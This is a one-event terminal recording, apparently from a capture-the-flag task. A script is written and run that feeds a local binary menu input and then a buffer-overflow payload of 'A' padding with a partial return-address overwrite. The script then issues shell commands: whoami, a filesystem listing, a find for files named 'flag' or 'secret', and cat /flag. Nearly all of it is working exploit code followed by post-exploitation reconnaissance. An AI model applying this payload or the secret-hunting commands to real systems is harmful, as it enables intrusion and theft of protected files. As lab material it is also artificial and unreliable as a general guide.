[3569.8772, "i", "cat << 'EOF' > /tmp/perfect.py\nimport subprocess, time, sys\n\np = subprocess.Popen(['/app/directory.bin'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)\n\ndef send(data):\n    p.stdin.write(data)\n    p.stdin.flush()\n    time.sleep(0.1)\n\nfor i in range(9):\n    send(b\"1\\n\")\n    send(b\"A\\n\")\n\nsend(b\"1\\n\")\nsend(b\"A\"*32 + b\"B\"*8 + b\"\\x3b\")\n\nsend(b\"4\\n\")\n\nsend(b\"echo EXPLOIT_SUCCESS\\n\")\nsend(b\"whoami\\n\")\nsend(b\"ls -la /\\n\")\nsend(b\"find / -name '*flag*' -o -name '*secret*' 2>/dev/null\\n\")\n# Sometimes the original CTF secret is passed in a hidden file\nsend(b\"cat /flag 2>/dev/null\\n\")\nsend(b\"exit\\n\")\n\ntime.sleep(1)\nprint(p.stdout.read().decode('latin1', errors='ignore'))\nEOF\npython3 /tmp/perfect.py\n"]
